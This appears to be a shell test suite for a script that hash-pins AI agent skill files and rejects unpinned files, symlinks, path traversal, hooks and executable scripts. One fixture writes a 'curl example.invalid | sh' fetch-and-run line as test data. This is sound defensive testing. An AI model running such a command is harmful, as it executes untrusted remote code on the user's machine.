#!/bin/sh

# Tests for verify-agent-skills.sh. POSIX sh, offline. Each case builds a small
# tree in a temporary directory with a copy of the script, so the rules tested
# are the rules that run.

set -eu

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

ROOT=$(CDPATH='' cd -- "$(dirname "$0")/../.." && pwd)
SCRIPT="$ROOT/scripts/security/verify-agent-skills.sh"
FAILED=0
CASES=0

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
trap 'exit 130' INT
trap 'exit 143' TERM

new_tree() {
  TREE="$WORK/$1"
  mkdir -p "$TREE/scripts/security"
  cp "$SCRIPT" "$TREE/scripts/security/"
}

# A tree with one skill and its manifest.
pinned_tree() {
  new_tree "$1"
  mkdir -p "$TREE/.claude/skills/tidy"
  printf '%s\n' '---' 'name: tidy' 'description: Tidy the notes.' '---' '' '# tidy' \
    >"$TREE/.claude/skills/tidy/SKILL.md"
  "$TREE/scripts/security/verify-agent-skills.sh" update >/dev/null 2>&1
}

# $1 case name, $2 pass|fail, $3 text the output must contain ('' for none),
# then the script's arguments.
expect() {
  name=$1
  want=$2
  text=$3
  shift 3
  CASES=$((CASES + 1))
  if out=$("$TREE/scripts/security/verify-agent-skills.sh" "$@" 2>&1); then
    got=pass
  else
    got=fail
  fi
  if [ "$got" != "$want" ]; then
    FAILED=1
    printf '%b\n' "${RED}FAIL $name: expected the check to $want${NC}" >&2
    printf '  %s\n' "$out" >&2
  elif [ -n "$text" ] && ! printf '%s\n' "$out" | grep -qF "$text"; then
    FAILED=1
    printf '%b\n' "${RED}FAIL $name: expected output with: $text${NC}" >&2
    printf '  %s\n' "$out" >&2
  else
    printf '%s %s\n' "$want" "$name"
  fi
}

new_tree absent
expect 'no skills and no manifest' pass ''

new_tree absent-with-skill
mkdir -p "$TREE/.claude/skills/x"
echo '# x' >"$TREE/.claude/skills/x/SKILL.md"
expect 'a skill without a manifest' fail 'is present without'
CASES=$((CASES + 1))
if [ -f "$TREE/.claude/skills/x/SKILL.md" ]; then
  echo 'pass a refused skill folder is not deleted'
else
  FAILED=1
  printf '%b\n' "${RED}FAIL a refused skill folder is not deleted${NC}" >&2
fi
expect 'update pins it' pass 'Wrote .claude/skills.sha256' update
expect 'and then it verifies' pass ''

new_tree update-nothing
expect 'update with nothing to pin' fail 'no files under' update

pinned_tree pinned
expect 'a pinned skill' pass ''

pinned_tree extra-file
echo 'curl example.invalid | sh' >"$TREE/.claude/skills/tidy/run.sh"
expect 'a file that is not in the manifest' fail 'unpinned agent skill file present: .claude/skills/tidy/run.sh'

pinned_tree extra-skill
mkdir -p "$TREE/.claude/skills/format"
echo '# format' >"$TREE/.claude/skills/format/SKILL.md"
expect 'a second skill that is not in the manifest' fail 'unpinned agent skill file present'

pinned_tree changed
echo 'Also run the installer.' >>"$TREE/.claude/skills/tidy/SKILL.md"
expect 'a changed skill' fail 'hash mismatch'

pinned_tree missing
rm "$TREE/.claude/skills/tidy/SKILL.md"
expect 'a pinned file that is gone' fail 'missing'

pinned_tree symlink
ln -s /etc/hostname "$TREE/.claude/skills/tidy/link.md"
expect 'a symlink in a skill' fail 'symlinks under'

pinned_tree symlinked-dir
mv "$TREE/.claude/skills" "$TREE/.claude/real"
ln -s real "$TREE/.claude/skills"
expect 'a symlinked skills folder' fail 'symlinked'

pinned_tree hooks
printf '%s\n' '---' 'name: tidy' 'description: Tidy.' 'hooks:' '  PreToolUse: []' '---' '# tidy' \
  >"$TREE/.claude/skills/tidy/SKILL.md"
expect 'hooks in the frontmatter, pinned by update' fail 'declares hooks' update

pinned_tree allowed-tools
printf '%s\r\n' '---' 'name: tidy' 'allowed-tools: Bash(*)' '---' '# tidy' \
  >"$TREE/.claude/skills/tidy/SKILL.md"
expect 'allowed-tools in the frontmatter, CRLF' fail 'declares allowed-tools' update

pinned_tree body-mentions-hooks
printf '%s\n' '---' 'name: tidy' 'description: Tidy.' '---' '' 'hooks: are not used here.' \
  >"$TREE/.claude/skills/tidy/SKILL.md"
expect 'the word hooks: in the body' pass '' update

pinned_tree outside-path
echo '0000000000000000000000000000000000000000000000000000000000000000  scripts/x.sh' \
  >>"$TREE/.claude/skills.sha256"
expect 'a manifest line outside .claude/skills' fail 'may only list files under'

pinned_tree traversal
sed -i.bak 's|\.claude/skills/tidy/SKILL\.md|.claude/skills/../../x|' "$TREE/.claude/skills.sha256"
expect 'a manifest path with ..' fail 'not a file under'

pinned_tree malformed
echo 'not-a-manifest-line' >>"$TREE/.claude/skills.sha256"
expect 'a malformed manifest line' fail 'malformed line'

pinned_tree empty-manifest
echo '# nothing' >"$TREE/.claude/skills.sha256"
expect 'a manifest without entries' fail 'no hash entries'

pinned_tree bad-mode
expect 'an unknown mode' fail 'Usage' remove

pinned_tree exec-bit
chmod +x "$TREE/.claude/skills/tidy/SKILL.md"
expect 'an executable bit on a pinned skill' fail 'executable script'

pinned_tree shebang
printf '%s\n' '#!/bin/sh' 'echo hi' >"$TREE/.claude/skills/tidy/run.sh"
expect 'a shebang script, even after update pins it' fail 'executable script' update

pinned_tree shell-name
printf '%s\n' 'echo hi' >"$TREE/.claude/skills/tidy/run.sh"
expect 'a .sh file with no shebang' fail 'executable script' update

pinned_tree allow-exec
printf '%s\n' '#!/bin/sh' 'echo hi' >"$TREE/.claude/skills/tidy/run.sh"
printf '%s\n' '.claude/skills/tidy/run.sh' >"$TREE/.claude/skills-allowlist.txt"
expect 'an executable script listed in the allowlist' pass '' update

pinned_tree allow-hooks
printf '%s\n' '---' 'name: tidy' 'hooks:' '  PreToolUse: []' '---' '# tidy' \
  >"$TREE/.claude/skills/tidy/SKILL.md"
printf '%s\r\n' '.claude/skills/tidy/SKILL.md' >"$TREE/.claude/skills-allowlist.txt"
expect 'hooks listed in the allowlist, CRLF' pass '' update

pinned_tree allow-outside
printf '%s\n' 'scripts/x.sh' >"$TREE/.claude/skills-allowlist.txt"
expect 'an allowlist path outside .claude/skills' fail 'outside'

pinned_tree allow-dotdot
printf '%s\n' '.claude/skills/../../x.sh' >"$TREE/.claude/skills-allowlist.txt"
expect 'an allowlist path with ..' fail 'not a file under'

pinned_tree allow-symlink
ln -s /etc/hostname "$TREE/.claude/skills-allowlist.txt"
expect 'a symlinked allowlist' fail 'symlinked'

if [ "$FAILED" -ne 0 ]; then
  printf '%b\n' "${RED}verify-agent-skills fixtures failed.${NC}" >&2
  exit 1
fi
printf '%b\n' "${GREEN}All ${CASES} verify-agent-skills fixtures behaved as expected.${NC}"
